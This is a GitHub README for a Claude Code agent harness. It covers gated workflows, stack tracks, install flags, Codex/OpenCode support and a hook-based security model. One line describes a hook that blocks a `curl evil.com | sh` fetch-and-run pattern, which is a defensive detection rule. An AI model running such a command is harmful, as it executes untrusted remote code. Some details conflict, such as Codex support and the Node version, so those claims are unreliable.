# uzys-claude-harness

> A Claude Code agent harness — 6-gate workflow + Ralph loop + 11 stack tracks. Lean by design.

[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![Version](https://img.shields.io/github/v/tag/uzysjung/uzys-claude-harness?label=version)](https://github.com/uzysjung/uzys-claude-harness/releases)
[![CI](https://github.com/uzysjung/uzys-claude-harness/actions/workflows/test.yml/badge.svg)](https://github.com/uzysjung/uzys-claude-harness/actions)

🇰🇷 **한국어 README**: [README.ko.md](./README.ko.md)

## 30-second start

```bash
# in your project directory:
npx -y github:uzysjung/uzys-claude-harness
# → interactive 3-step wizard (since v26.54.0):
#     1/3. Tracks   (preset: csr-supabase, ssr-nextjs, ...)
#     2/3. CLI      (claude / codex / opencode)
#     3/3. What will be installed  ← single all-in-one group multiselect
#          ━━ Frontend / Backend / Data / Business / Dev Tools / Workflow / ECC ━━
#          Category headers show [N/M ✓ default] count of preset-recommended assets
#   ESC at step 2/3 = silent back to previous (no "Cancelled" strikethrough)
#   ESC at step 1 = exit
#
# IMPORTANT (v26.55.0+, ADR-016 BREAKING):
#   ECC cherry-pick (code-reviewer / security-reviewer / continuous-learning-v2 /
#   eval-harness / python-* / commands/ecc / etc.) is now opt-in. Default install
#   ships only first-party assets. Check `ecc-plugin` in step 3 to include them.
#
# IMPORTANT (v26.56.0+, ADR-017 BREAKING):
#   Codex `~/.codex/prompts/uzys-*.md` global copy now requires BOTH
#   `cli=codex` AND `withUzysHarness`. Previously cli=codex alone triggered it,
#   which left Claude `.claude/commands/uzys/` missing → /uzys-spec asymmetry.
#   Migration: check `uzys-harness 6-Gate workflow` in step 3, or pass
#   `--with-codex-prompts` for legacy behavior.

# Non-interactive (CI / scripted) — use the `install` subcommand:
#   npx -y github:uzysjung/uzys-claude-harness install --track <NAME>
#   --with <asset-id>    : force-include external asset (repeatable)
#   --without <asset-id> : force-exclude from preset recommendation (repeatable)
#   --with-uzys-harness  : opt-in 6-Gate slash commands (v26.44.0+ BREAKING)
#   --with-ecc           : opt-in ECC cherry-pick agents/skills/commands (v26.55.0+ BREAKING)
#   --with-codex-prompts : legacy force-on Codex global prompts (v26.56.0+ override)
#   --no-codex-prompts   : opt-out Codex global prompts

# then start Claude Code:
claude
> /uzys:spec    # define what you're building
> /uzys:auto    # run the full pipeline (Plan → Build → Test → Review → Ship)
```

> **Wizard vs `install` subcommand**: the wizard is the no-subcommand path
> (`claude-harness`). The `install` subcommand is **non-interactive only** and
> requires `--track`. If you accidentally run `claude-harness install` without
> `--track`, the error message points you back to the wizard form.

Tracks available in the prompt: `csr-supabase`, `csr-fastify`, `csr-fastapi`, `ssr-nextjs`, `ssr-htmx`, `data`, `executive`, `tooling`, `full`, `project-management`, `growth-marketing` — see [Tracks](#tracks-full-reference).

> Alternative: `bash <(curl -fsSL https://raw.githubusercontent.com/uzysjung/uzys-claude-harness/main/install.sh)` — backward-compat wrapper. Internally calls the same `npx` command. Use when you don't have `npx` in PATH yet but Node 20+ is installed. For CI / unattended scripts, see [Flag mode](#flag-mode-ci--automation).

## Why this?

| Use it when… | Skip it when… |
|--------------|---------------|
| You want a **deterministic 6-gate workflow** (Spec → Ship) instead of free-form chat | You're doing a single-line fix and just need plain Claude Code |
| You work across **multiple stacks** (Python REST + React, Next.js, data/PySide6, executive docs) and want one harness | You only ever touch one stack and one set of tools |
| You want **ECC, agent-skills, Anthropic skills, Railway, Supabase** wired up per-track without manual setup | You prefer to install each plugin/MCP yourself with full control |
| You want the LLM constrained by **hooks** (file protection, security scan, gate ordering) — not just prompts | You want minimal intervention between the model and the filesystem |
| You value **lean** — every Rule/Hook earns its place; obvious linter-territory stuff is removed | You like comprehensive style guides and "best practices" enforced everywhere |

## What is this?

A **deterministic harness** around [Claude Code](https://claude.com/claude-code) that:

- Enforces a **6-gate workflow** (`Spec → Plan → Build → Test → Review → Ship`) via hooks — opt-in via `--with-uzys-harness` (v26.44.0+ BREAKING)
- Supports **11 stack tracks** (csr-supabase / csr-fastify / csr-fastapi / ssr-htmx / ssr-nextjs / data / executive / tooling / full / project-management / growth-marketing)
- Curates **6 workflow alternatives** (uzys-harness / addy-agent-skills / superpowers / gsd) — pick one or more, all opt-in
- Bundles **vetted plugins, skills, MCP servers, and agents** per track ([docs/REFERENCE.md](./docs/REFERENCE.md))
- Stays **lean** — Rule 17 files / Hook 6 auto-registered. Removes anything obvious or duplicate.
- Self-improves via **continuous-learning + Ralph loop** (SPEC-driven autonomous cycle)
- Project-scoped only. **Global `~/.claude/` is never touched.**

### Built-in custom skills

Beyond the cherry-picked ones, the harness ships three skills of its own:

| Skill | Purpose | When |
|-------|---------|------|
| **`north-star`** | 4-gate decision heuristic (Trend / Persona / Capability / Lean) + NORTH_STAR.md template. Filters scope creep before plan phase. | `/uzys:spec` start for 6+ month projects; `/uzys:plan` for Complex tasks |
| **`ui-visual-review`** | Playwright / chrome-devtools screenshot capture → baseline diff → agent-side REGRESSION classification → user approval. Blocks Review Gate on regression. | `/uzys:test` pass on csr-*/ssr-*/full tracks |
| **`spec-scaling`** | Detects SPEC/PRD > 300 lines and proposes feature-based or area-based splitting (docs/specs/ or docs/PRD/). | Auto-trigger on `/uzys:spec` when doc grows large |

Plus templates worth knowing: **`docs/PLAN.template.md`** (Phase × Milestone dependency graph with Critical Path), **`docs/NORTH_STAR.template.md`**, and **ADR Status workflow** (`Proposed → Accepted → Superseded/Deprecated`) in `.claude/rules/change-management.md`.

Built for senior engineers / multi-role users (CEO/CTO/CISO/data scientist) who want the same harness across very different stacks.

## Installation

### Step 1 — Pick your Track

| Stack you're building | Track to install |
|----------------------|----------------|
| Python REST API + React/shadcn/ui | `csr-fastapi` |
| TypeScript REST API + React/shadcn/ui | `csr-fastify` |
| Realtime / Auth / Postgres (Supabase) + React/shadcn/ui | `csr-supabase` |
| SEO + React/shadcn/ui (SSR) | `ssr-nextjs` |
| Minimal JS (server-rendered + HTMX + daisyUI) | `ssr-htmx` |
| Data analysis / ML / DL / PySide6 desktop | `data` |
| Proposals / PPT / financial models (no code) | `executive` |
| Bash / CLI / markdown meta-projects | `tooling` |
| Two or more (e.g., tooling + Python) | `--track tooling --track csr-fastapi` (multi) or `full` |

### Step 2 — Install (interactive — recommended)

```bash
# in your project directory:
npx -y github:uzysjung/uzys-claude-harness
```

The installer auto-detects your current state:

- **First time** → walks you through: Track selection → Tauri / GSD / ECC / Trail of Bits options → CLI target (Claude / Codex / OpenCode / All) → summary → confirm
- **Existing install detected** → shows a 5-action menu:
  1. Add a new Track
  2. Update policy files (auto-backup)
  3. Remove Track *(unsupported in v27 — manually edit `.claude/`)*
  4. Reinstall (backs up current `.claude/` first)
  5. Exit

#### Flag mode (CI / automation)

For CI/CD or scripted environments, use the `install` subcommand with flags:

```bash
npx -y github:uzysjung/uzys-claude-harness install --track <TRACK>
```

`install` requires at least one `--track`; non-TTY environments without `--track` exit with an error.

What the installer does:
1. Resolves `templates/` from the bundled CLI package (npx fetches latest from GitHub ref)
2. Copies Track-specific assets to `.claude/`, `.mcp.json`, project root
3. (Optional) Generates Codex `.codex/` and/or OpenCode `.opencode/` artifacts when `--cli` includes them
4. Records installed Tracks to `.claude/.installed-tracks` (used for next install state detection)

After install you'll see an Installation Report (`✅` row per category).

### Step 3 — Start Claude Code

```bash
claude
# inside Claude Code:
/uzys:spec    # define what you're building
/uzys:auto    # then run the full pipeline (Plan → Build → Test → Review → Ship)
```

---

## Common scenarios

### Add another Track to an existing install

Already installed `csr-fastapi`? Want to also add `tooling` (for the harness's own bash/markdown work)?

```bash
npx -y github:uzysjung/uzys-claude-harness
# → 5-action menu appears (existing install detected)
# → choose "1) Add a new Track" → pick tracks → confirm
```

The Add Track action preserves existing `.claude/*` and merges new MCPs into `.mcp.json` (idempotent).

### Update an existing install to the latest harness version

When a new release comes out (check [CHANGELOG.md](./CHANGELOG.md)):

```bash
npx -y github:uzysjung/uzys-claude-harness
# → 5-action menu → choose "2) Update policy files (auto-backup)"
```

What the Update action does:
1. **Backup** — snapshots current `.claude/` to `.claude.backup-<timestamp>/`
2. **Overwrite** — replaces `rules/*.md`, `agents/*.md`, `commands/uzys/*.md`, `hooks/*.sh`, `.claude/CLAUDE.md` with latest templates (only files that already exist — no Track creep)
3. **Prune orphans** — removes files in `.claude/` that no longer exist in templates (e.g., deprecated `ecc-security-common.md`)
4. **Clean stale hook refs** — removes `settings.json` PreToolUse/PostToolUse entries that point to non-existent hook files

**Preserved**: `gate-status.json`, `.mcp.json` (your custom MCPs stay), `docs/SPEC.md`/`PRD.md`, `.claude/settings.local.json`.

Rollback if needed:
```bash
rm -rf .claude && mv .claude.backup-<timestamp> .claude
```

### Install on this repo itself (dogfooding)

```bash
git clone https://github.com/uzysjung/uzys-claude-harness.git
cd uzys-claude-harness
npx -y github:uzysjung/uzys-claude-harness
# → pick `tooling` in the Track prompt
```

### Multi-Track in one go (union)

```bash
npx -y github:uzysjung/uzys-claude-harness
# → in the Track prompt, press <space> on multiple Tracks (e.g. tooling + csr-fastapi)
```

Use this when you know upfront you need multiple tracks. Faster than two separate runs.

### Optional — install ECC plugin + cherry-pick (v26.55.0+ BREAKING)

ECC is fully opt-in since v26.55.0 (ADR-016). Two layers:

**Layer A — ECC marketplace plugin** (`ecc@ecc` from `affaan-m/everything-claude-code`). Check `ecc-plugin` in step 3, or `--with-ecc` for non-interactive.

**Layer B — ECC cherry-pick** (agents/skills/commands curated into this repo's `templates/`). Same flag. When `withEcc=true`, the following ship to your `.claude/`:

| Kind | Items |
|---|---|
| Agents | `code-reviewer`, `security-reviewer`, `silent-failure-hunter`, `build-error-resolver` |
| Skills | `continuous-learning-v2`, `strategic-compact`, `deep-research`, `eval-harness`, `verification-loop`, `agent-introspection-debugging`, `e2e-testing`, `python-patterns`, `python-testing` |
| Commands | `/ecc:*` |

Without `--with-ecc` (default), only first-party agents/skills are installed: `reviewer`, `data-analyst`, `strategist`, `plan-checker`, `north-star`, `gh-issue-workflow`, `ui-visual-review`.

For the project-scoped plugin install option:

```bash
claude --plugin-dir .claude/local-plugins/ecc
# or alias: alias claude-ecc='claude --plugin-dir .claude/local-plugins/ecc'
```

The global `~/.claude/` is never touched (D16 — global protection).

### Interactive prompts — what asks, when, how to skip

`claude-harness install` has 4 optional prompts. Each has an explicit flag for unattended/CI use.

| Prompt | When does it appear? | Auto-y flag |
|--------|---------------------|-------------|
| **Track selection** (1-9) | `--track` not given AND TTY available | `--track <name>` |
| **GSD orchestrator** | dev track AND fresh install (not `--add-track`) AND TTY available | `--gsd` |
| **Trail of Bits security** | dev track AND fresh install AND TTY available | `--with-tob` |
| **ECC project-scoped install** | fresh install AND TTY available | `--with-ecc` |
| **ECC prune (89 KEEP)** | After ECC install confirmed | `--with-prune` (implies `--with-ecc`) |

#### Environment ↔ prompt behavior matrix

| Environment | TTY available? | Prompts shown? |
|-------------|:-:|:-:|
| Local terminal `claude-harness install ...` | ✅ | ✅ |
| **`curl … \| bash …` from terminal** | ✅ (via `/dev/tty`) | ✅ |
| CI runner / SSH `-T` no-tty | ❌ | ❌ (auto-skip; use flags) |

#### Add Track / Update via interactive menu

To augment an existing install (Add Track / Update), run the installer with no flags — the 5-action menu detects existing state and routes accordingly. Bash-era `--add-track` / `--update` flags were retired in v0.2.0 in favor of the interactive router.

```bash
# Existing install detected → 5-action menu
npx -y github:uzysjung/uzys-claude-harness
```

#### Full unattended install (CI / scripts)

In a TTY environment, the interactive installer asks about each opt-in feature. **In CI / no-TTY**, prompts can't run — those features are silently skipped unless you pass the flag explicitly. Minimum:

```bash
npx -y github:uzysjung/uzys-claude-harness install --track csr-fastapi
```

If you want any of the opt-in features in CI, add the flag:

| Flag | What it enables (would otherwise be a prompt in TTY mode) |
|------|------------------------------------------------------------|
| `--with-ecc` | Install ECC plugin project-scoped |
| `--with-prune` | Prune ECC items beyond curated 89 (implies `--with-ecc`) |
| `--with-tob` | Install Trail of Bits security plugin |
| `--with-gsd` | Install GSD orchestrator |
| `--with-tauri` | Include the Tauri desktop rule |

### Other flags

```bash
npx -y github:uzysjung/uzys-claude-harness --help                 # show full options
```

### Prerequisites

- Node.js 22+
- Git
- Claude Code CLI (`claude`)
- jq (recommended; bash fallback exists)

## Tracks (full reference)

| Track | Stack | Role | Auto-installed |
|-------|-------|------|----------------|
| `csr-supabase` | Supabase + React/shadcn/ui | Developer | + Tauri, Supabase MCP, Vercel CLI, Netlify CLI |
| `csr-fastify` | TypeScript REST API + React/shadcn/ui | Developer | + Tauri, Railway MCP |
| `csr-fastapi` | Python REST API + React/shadcn/ui | Developer | + Tauri, Railway MCP |
| `ssr-htmx` | FastAPI + Jinja2 + HTMX + daisyUI | Developer | + Railway MCP |
| `ssr-nextjs` | Next.js + shadcn/ui | Developer | + Railway MCP, next-skills |
| `data` | Python + DuckDB + Trino + ML/DL + PySide6 | Data Scientist | + polars/dask/wshobson skills, Anthropic data plugin |
| `executive` | PPT/Excel/Word/PDF + proposals/DD | CPO/CSO/CTO | + document-skills, c-level-skills (28), business-growth-skills, finance-skills (alirezarezvani/claude-skills marketplace) |
| `tooling` | Bash + Markdown + CLI tools (meta projects) | Tool Developer | + cli-development rules |
| `full` | Union of everything | All | All MCPs + all plugins |
| `project-management` (v0.5.0) | Jira/Confluence/Atlassian + PRD/RICE | PM / Scrum Master | + pm-skills (6), product-skills (15) |
| `growth-marketing` (v0.5.0) | SEO/CRO/content/demand-gen | Growth / Marketing Lead | + marketing-skills (44), content-creator, demand-gen, research-summarizer, business-growth-skills (재사용) |

### Common tools (all dev tracks)

Installed regardless of track (executive gets a subset):

| Category | Item | Purpose |
|----------|------|---------|
| Plugin | `addy-agent-skills`, `Impeccable` | 6-gate workflow backbone + design quality |
| Plugin (v0.5.0) | `karpathy-coder` | 4 Python tool + reviewer agent + `/karpathy-check` + pre-commit hook — CLAUDE.md P1-P4 enforcement. v0.6.0+ `--with-karpathy-hook` opt-in 시 PreToolUse 자동 와이어링 (USAGE 4 level 가이드) |
| Skill (cherry-pick) | `deep-research` | Multi-source research (firecrawl + exa) — all dev tracks |
| Skill (cherry-pick) | `market-research` | Competitive / TAM research — `executive` only |
| Skill (npx) | `find-skills` (vercel-labs) | On-demand skill discovery |
| CLI (global) | `agent-browser` (vercel-labs) | Browser automation CLI |
| CLI (global) | `playwright` | E2E + UI visual review |
| MCP (project) | `context7`, `github`, `chrome-devtools` | Docs fetch / GitHub / DevTools. Project-scoped via `.mcp.json` |
| Status line | `claude-powerline` | `statusLine` in `.claude/settings.json` |

Full asset list with trust tiers: [docs/REFERENCE.md](./docs/REFERENCE.md).

## How it works

```
┌────────────────────────────────────────────────────────────────┐
│  Project (.claude/)                                             │
│  CLAUDE.md  →  11 principles + Decision meta-rule + gates       │
│                                                                  │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐             │
│  │ commands/   │  │ rules/ (17) │  │ skills/     │             │
│  │ uzys:* (7)  │  │ git-policy  │  │ CL-v2       │             │
│  │ ecc:*  (8)  │  │ test-policy │  │ spec-scaling│             │
│  │             │  │ ship-       │  │ deep-       │             │
│  │             │  │ checklist   │  │ research    │             │
│  └─────────────┘  └─────────────┘  └─────────────┘             │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐             │
│  │ agents/ (8) │  │ hooks/ (6)  │  │ .mcp.json   │             │
│  │ reviewer    │  │ session     │  │ context7    │             │
│  │ data-       │  │ protect     │  │ github      │             │
│  │ analyst     │  │ gate-check  │  │ chrome-     │             │
│  │ strategist  │  │ agentshield │  │ devtools    │             │
│  │ + 5 ECC     │  │ + 1 utility │  │ + per-track │             │
│  └─────────────┘  └─────────────┘  └─────────────┘             │
└────────────────────────────────────────────────────────────────┘
```

The 6-gate workflow is enforced by `gate-check.sh` (PreToolUse hook). Skipping a gate returns exit 2 with a blocker message. `/uzys:auto` runs the full pipeline as a Ralph loop until SPEC compliance is met (max 5 iterations).

## Example workflow

Building "an internal note-taking app with Postgres + Auth" on `csr-fastapi`:

```bash
# 1. Install harness on a fresh project
mkdir notes && cd notes && git init
npx -y github:uzysjung/uzys-claude-harness
# → pick `csr-fastapi` in the Track prompt

# 2. Open Claude Code
claude

# Inside Claude Code:
> /uzys:spec
# → Pre-SPEC questionnaire kicks in:
#   - Prod DB engine?            "Postgres 16 (Railway)"
#   - Test DB strategy?          "testcontainer (Postgres 16)"
#   - External deps?             "GitHub OAuth (Live staging E2E required)"
#   - Critical E2E flows?        "login → callback → /me, create note"
#   - DESIGN.md/.impeccable.md?  "no — invoke /teach to set design tone first"
# → docs/SPEC.md generated with Objective, AC, Non-Goals, DO NOT CHANGE

> /uzys:auto
# → Plan: trivial=skip, standard=milestones (3-5), complex=full task list
#   (model-aware — Opus skips micro-decomposition, Haiku gets detailed)
# → Build: per task, write failing test (RED) → implement (GREEN) → refactor
# → Test: testcontainer Postgres + Live OAuth E2E (Mock not allowed)
# → Review: 5-axis (correctness/readability/architecture/security/perf)
#   via reviewer subagent (context: fork) — separate from implementor
# → Ship: agentshield scan + SPEC drift check + Railway deploy
# → Ralph loop iterates max 5 times if SPEC AC not met, then escalates
```

Behind the scenes:
- `protect-files.sh` blocks Edits to `.env`, lock files, credentials
- `gate-check.sh` blocks `/uzys:plan` if `define.completed=false`
- `mcp-pre-exec.sh` enforces MCP allowlist + blocks `curl evil.com | sh` patterns
- `agentshield-gate.sh` blocks `/uzys:ship` on CRITICAL findings

## Codex CLI support

Beyond Claude Code, this harness can install for **OpenAI Codex CLI** (0.124.0+). Claude Code remains the SSOT — Codex assets are derived via a transform script.

### Install for Codex

Interactive (recommended):
```bash
npx -y github:uzysjung/uzys-claude-harness
# Pick: ① tooling   |   2c) CLI: ② Codex
```

Flag mode (CI / automation):
```bash
npx -y github:uzysjung/uzys-claude-harness --track tooling --cli codex --project-dir .
```

`--cli` is **repeatable** (v0.7.0+). Accepts any combination of `claude` / `codex` / `opencode` (3 base × 7 combination):

```bash
# Single CLI
--cli codex

# Multi-CLI (v0.7.0 — repeatable)
--cli claude --cli codex                # 2 CLI
--cli claude --cli codex --cli opencode # all 3
--cli claude --cli opencode             # 신규 — Codex 제외
--cli codex --cli opencode              # 신규 — Claude 제외
```

**v0.8.0 BREAKING — `both` / `all` alias 제거됨**. v0.7.x 사용자는 마이그레이션 필요:

| v0.7.x (legacy alias) | v0.8.0+ (canonical) |
|-----------------------|---------------------|
| `--cli both` | `--cli claude --cli codex` |
| `--cli all` | `--cli claude --cli codex --cli opencode` |

v0.8.0에서 alias를 그대로 쓰면 명확한 마이그레이션 hint와 함께 즉시 reject. CI 스크립트/문서 갱신 필수.

**v0.8.0 — `.claude/` 조건부 생성**: `--cli` 에 `claude` 가 없으면 (예: `--cli codex` 단독) `.claude/` baseline 미생성. Codex/OpenCode 단독 사용자의 dead weight 회피. `.mcp.json` 은 모든 CLI 가 사용하므로 `cli` 무관 항상 생성.

**Codex slash 통일**: `--with-codex-prompts` 추가하면 `~/.codex/prompts/uzys-*.md` 6 file 글로벌 복사 → Codex에서 `/uzys-spec` slash 작동. opt-in (D16). 자세한 내용 [USAGE.md](./docs/USAGE.md#multi-cli-설치-v070-breaking).

### What gets installed

When `--cli` includes `codex` (alone or combined with claude / opencode), after the standard install completes the harness runs `src/codex/transform.ts` to generate:

```
<project>/
├── AGENTS.md                          # generated from .claude/CLAUDE.md
└── .codex/
    ├── config.toml                    # sandbox + approval + [[hooks.*]] + [mcp_servers.*]
    └── hooks/
        ├── session-start.sh           # session_start
        ├── hito-counter.sh            # user_prompt_submit
        └── gate-check.sh              # pre_tool_use matcher="Skill"

~/.codex/skills/uzys-{spec,plan,build,test,review,ship}/SKILL.md   # opt-in (you'll be asked)
```

Slash commands: Codex doesn't support `:` in slash names, so `/uzys:spec` becomes `/uzys-spec`, etc.

### Two opt-in prompts (touch `~/.codex/`)

After the transform runs, the installer asks:

```
~/.codex/skills/ 에 uzys-* 6종 설치? [y/N]
~/.codex/config.toml 에 프로젝트 trust entry 추가? [y/N]
```

Both default to **No**. Decline = no global mutation. Accept on the second one is required for project-scope `.codex/config.toml` hooks to load.

### Known limitations (Codex 0.124.0 upstream)

- **`pre_tool_use` / `post_tool_use` only fire for the Bash tool** — ApplyPatch (file writes) is not intercepted ([openai/codex#16732](https://github.com/openai/codex/issues/16732)). The harness compensates with `sandbox_mode = "workspace-write"` + `approval_policy = "on-request"` (stronger than a hook in the file-write path).
- **Project-scope hooks may not load in interactive sessions** ([openai/codex#17532](https://github.com/openai/codex/issues/17532)). `codex exec` (non-interactive) is unaffected.

### References

- Full SPEC: [`docs/specs/codex-compat.md`](./docs/specs/codex-compat.md)
- Hook strategy ADR: [`docs/decisions/ADR-002-codex-hook-gap.md`](./docs/decisions/ADR-002-codex-hook-gap.md) (Accepted)
- Compatibility matrix: [`docs/research/codex-compat-matrix-2026-04-24.md`](./docs/research/codex-compat-matrix-2026-04-24.md)
- Dogfood verification: [`docs/evals/codex-install-2026-04-25.md`](./docs/evals/codex-install-2026-04-25.md)

## OpenCode CLI support

Beyond Claude Code and Codex, this harness can install for **[OpenCode](https://opencode.ai)** (anomalyco/opencode 0.x). Claude Code remains the SSOT — OpenCode assets are derived via TS transform + a JS/TS plugin for hook lifecycle.

### Install for OpenCode

Interactive (recommended):
```bash
npx -y github:uzysjung/uzys-claude-harness
# Pick: ① tooling   |   2c) CLI: ③ OpenCode (or ⑤ All)
```

Flag mode (CI / automation):
```bash
npx -y github:uzysjung/uzys-claude-harness install --track tooling --cli opencode
```

`--cli claude --cli codex --cli opencode` installs all 3 CLI in one command (v0.8.0 — replaces deprecated `--cli all`).

### What gets installed

When `--cli` includes `opencode` (alone or combined), after the standard install completes the harness runs `src/opencode/transform.ts` to generate:

```
<project>/
├── AGENTS.md                                      # generated from .claude/CLAUDE.md (slash rename)
├── opencode.json                                  # $schema + mcp + command + agent + plugin + permission
└── .opencode/
    ├── commands/
    │   ├── uzys-spec.md                          # frontmatter: description + agent
    │   ├── uzys-plan.md
    │   ├── uzys-build.md
    │   ├── uzys-test.md
    │   ├── uzys-review.md
    │   └── uzys-ship.md
    └── plugins/
        └── uzys-harness.ts                       # 3 hook plugin (TS, self-contained)
```

No global mutation — `~/.opencode/` is never touched (D16).

### Hook lifecycle (3 hook mapping)

OpenCode plugin API supports rich lifecycle hooks. The bundled `uzys-harness.ts` plugin maps Claude Code hooks 1:1:

| Claude hook | OpenCode plugin hook | Behavior |
|-------------|----------------------|----------|
| `PreToolUse` (gate-check) | `tool.execute.before` | Throws if `/uzys-<phase>` runs before its prerequisite gate is complete |
| `PostToolUse` (spec-drift) | `tool.execute.after` | Logs to `.claude/evals/spec-drift-YYYY-MM-DD.log` when `docs/SPEC.md` or `docs/specs/*.md` is edited |
| `UserPromptSubmit` (HITO) | `messageCreated` (filter `role==="user"`) | Appends timestamp to `.claude/evals/hito-YYYY-MM-DD.log` (privacy: prompt body never logged) |

Slash commands: filename = command name (`uzys-spec.md` → `/uzys-spec`). Hyphenated for filesystem compatibility (Phase B2 decision).

### Slash commands

```
/uzys-spec     Define
/uzys-plan     Plan
/uzys-build    Build
/uzys-test     Verify
/uzys-review   Review
/uzys-ship     Ship
```

### Known limitations (Phase F dogfood — live verification pending)

- Plugin runtime (Bun vs Node) — `node:fs` + `@opencode-ai/plugin` 1.14.24 used; both runtimes supported.
- Live `tool.execute.before` argument signature — 3 fallback paths in plugin (`input.command` / `input.tool` / `input.args.command`); confirmed via static tests, live signature verification pending.

### References

- Full SPEC: [`docs/specs/opencode-compat.md`](./docs/specs/opencode-compat.md)
- Plugin mapping ADR: [`docs/decisions/ADR-004-opencode-plugin-mapping.md`](./docs/decisions/ADR-004-opencode-plugin-mapping.md) (Accepted)
- Compatibility matrix: [`docs/research/opencode-compat-matrix-2026-04-25.md`](./docs/research/opencode-compat-matrix-2026-04-25.md)
- Dogfood verification: [`docs/evals/opencode-install-2026-04-25.md`](./docs/evals/opencode-install-2026-04-25.md)

## 11 Behavioral Principles

Distilled from Karpathy's LLM observations + Anthropic Harness Design + production agent operations:

1. **Think Before Acting** — No assumptions
2. **Simplicity First** — Unmentioned = out of scope
3. **Surgical Changes** — Touch only what's needed; DO NOT CHANGE protection
4. **Goal-Driven Execution** — Verifiable success criteria
5. **Separate Eval from Gen** — SOD via reviewer subagent (context fork)
6. **Long-Running Management** — Phases + human gates
7. **Fact vs Opinion** — Sources required
8. **Sprint Contract** — Define "done" before starting
9. **Circuit Breakers** — 3 failures → stop and report
10. **Harness Maintenance** — Start simple, add only when needed, prune quarterly
11. **Perimeter Not Blueprint** — Define what+why+boundaries; let the agent decide how

Plus a **Decision Making meta-rule**: every value judgment must be backed by an explicit, verifiable criterion. No vibes-based decisions.

## Documentation

| File | Purpose |
|------|---------|
| [README.ko.md](./README.ko.md) | Korean version of this README |
| [docs/USAGE.md](./docs/USAGE.md) | Day-to-day workflow guide (`/uzys:*` commands, gate flow) |
| [**docs/REFERENCE.md**](./docs/REFERENCE.md) | **Catalog of all installed assets** (Plugins / Skills / MCP / Agents / Cherry-pick) with trust tier and exact install commands |
| [CONTRIBUTING.md](./CONTRIBUTING.md) | How to add tracks / rules / hooks / commands |
| [CHANGELOG.md](./CHANGELOG.md) | Release history |

## Optional ECC integration

[Everything-Claude-Code (ECC)](https://github.com/affaan-m/everything-claude-code) bundles 300+ skills/agents/commands. The `claude-harness install` end-of-flow offers a 2-step prompt:

```
[ECC] Plugin 프로젝트 스코프 설치 (선택사항)
  1. Install ECC project-scoped (copy)? [y/N]
  2. Prune unused items (keep 89 curated)? [y/N]
  → DELETED/KEPT file list shown after prune
```

Run with `claude --plugin-dir .claude/local-plugins/ecc` afterwards. Global `~/.claude/` stays untouched.

## Installation report

After `claude-harness install` completes you get a verification table:

```
│ Category         │ Found  │ Expected │ Status │
│ Rules            │ 8      │ 8        │   ✅   │
│ Commands uzys:   │ 7      │ 7        │   ✅   │
│ Commands ecc:    │ 8      │ 8        │   ✅   │
│ Agents           │ 8      │ 8        │   ✅   │
│ Hooks            │ 7      │ 7        │   ✅   │
│ Skills           │ 7      │ 7        │   ✅   │
│ MCP servers      │ 3      │ 3        │   ✅   │
│ .mcp-allowlist   │ yes    │ yes      │   ✅   │
│ settings.json    │ yes    │ yes      │   ✅   │
│ Plugins          │ tried  │ network  │   ✅   │
```

CI runs `npm test` (≈5s, 85 tests) on every PR.

## Updating cherry-picked content

Cherry-picks (ECC skills, status line wrapper, etc.) are tracked in `.dev-references/cherrypicks.lock` by source repo + commit SHA + per-file hash.

```bash
# Check drift only (no writes)
bash scripts/sync-cherrypicks.sh

# Auto-apply upstream changes for unmodified files
bash scripts/sync-cherrypicks.sh --apply

# CI gate — exit 1 if drift detected
bash scripts/sync-cherrypicks.sh --check
```

Locally modified cherry-picks are marked `modified: true` and **never** overwritten — drift only reported.

## Security model

- **MCP allowlist**: `.mcp-allowlist` file gates every MCP call via `mcp-pre-exec.sh` hook
- **D16 protection**: `claude-harness install --project-dir` blocks `~/.claude/*`, `/etc/*`, system bins
- **`.env` / credentials shielded**: `protect-files.sh` hook blocks Write/Edit on protected paths
- **Pre-ship security gate**: `agentshield-gate.sh` runs `npx ecc-agentshield scan` before `/uzys:ship`
- See [docs/REFERENCE.md §8](./docs/REFERENCE.md#8-보안--신뢰-정책) for the full security policy

## Project Direction

This harness is built around three commitments (see `templates/CLAUDE.md`):

1. **ECC.tools dependency** — minimal in-house code; orchestrate ECC skills/agents via `/uzys:*`
2. **Ralph loop autonomy** — SPEC-based autonomous cycle via continuous-learning-v2 + `/uzys:auto`
3. **Lean by design** — feature additions only after "is this in ECC already?" check; quarterly P10 audit

## FAQ

**Q. Does this work on Linux / WSL / Windows?**
A. macOS + Linux (incl. WSL) are tested in CI. Native Windows shell is not supported — use WSL.

**Q. Will it touch my global `~/.claude/`?**
A. No. `claude-harness install --project-dir` blocks `~/.claude/*`, `/etc/*`, `/usr/bin/*` etc. (D16 protection). All installation is project-scoped.

**Q. What if I already installed an older version?**
A. `npx -y github:uzysjung/uzys-claude-harness --update --project-dir .` — backs up `.claude/` to `.claude.backup-<ts>/`, overwrites only existing files with latest templates, prunes orphans (e.g., deprecated rule files), cleans stale hook references in `settings.json`.

**Q. Why 11 Tracks? Isn't that over-engineered?**
A. Tracks are conditional install lists, not abstractions. Adding a Track = one TSV row + one rule mapping. No runtime cost. Use only the Tracks you need; `--track` selection is explicit. v0.5.0 added `project-management` (PM/Scrum) and `growth-marketing` (Growth/Marketing) for non-dev personas.

**Q. Can I use this without ECC plugin?**
A. Yes. ECC is opt-in (interactive prompt or `--with-ecc` flag). The 6-gate workflow + agent-skills + per-track plugins work standalone.

**Q. How do I add a new Track / Rule / Hook?**
A. See [CONTRIBUTING.md](./CONTRIBUTING.md) — step-by-step guide for each.

**Q. Can I use this with Cursor / Codex instead of Claude Code?**
A. Not yet. Hooks and `settings.json` syntax are Claude Code specific. Most agent-skills (npx skills) work cross-host (Agent Skills standard), but the harness orchestration is Claude-specific.

**Q. The harness feels opinionated. Can I override?**
A. Yes. The interactive installer detects existing installs and prompts before overwriting. You can edit any `.claude/rules/*.md` or `templates/*` and they stick — re-running `claude-harness install` only overwrites when you explicitly choose the "update / 재설치" action.

## License

MIT — Copyright (c) 2026 Jay (Uzys Jung). See [LICENSE](./LICENSE).

## References

Core design influences (full asset catalog in [docs/REFERENCE.md](./docs/REFERENCE.md)):

- [agent-skills](https://github.com/addyosmani/agent-skills) — 6-gate workflow backbone
- [Everything-Claude-Code](https://github.com/affaan-m/everything-claude-code) — vetted skills/agents/commands
- [Anthropic skills](https://github.com/anthropics/skills) — document workflows (pptx/docx/xlsx/pdf)
- [Impeccable](https://github.com/pbakaus/impeccable) — design quality
